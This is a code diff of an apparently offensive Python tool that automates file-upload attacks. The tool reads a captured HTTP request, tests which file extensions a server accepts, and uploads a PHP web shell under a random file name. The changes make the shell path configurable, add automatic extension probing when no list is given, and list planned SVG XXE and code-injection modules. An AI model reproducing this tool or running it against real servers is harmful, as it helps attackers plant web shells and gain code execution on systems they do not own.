@@ -24,6 +24,8 @@ from argparse import RawTextHelpFormatter
 #   htaccess module
 #   .COM payload
 #   Add --level
+#   SVG XXE module
+#   Code injection module
 
 # Set of colors
 red = '\u001b[31;1m'
@@ -388,8 +390,9 @@ def main():
     content, headers, host, path = parse_request_file(options.request_file)
     upload_url = f"http://{host}{options.upload_dir}"
 
-    accepted_extensions = options.accepted_extensions.split(",")
-    if (len(accepted_extensions) < 1):
+    if (options.accepted_extensions != False): 
+        accepted_extensions = options.accepted_extensions.split(",")
+    else:
         #Test for accepted formats
         info("Testing for accepted file types")
         print()
@@ -406,7 +409,7 @@ def main():
         if (len(accepted_php_extensions) > 0):
             for accepted_php_extension in accepted_php_extensions:
                 info(f"Trying to upload .{accepted_php_extension} shell...")
-                with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
+                with open(variations.shell_path, 'rb') as file: file_data = file.read()
                 file_name = generate_random_string(10) + f".{accepted_php_extension}"
                 session = upload_and_validate(options.request_file, session, file_data, file_name, "application/x-httpd-php")
 
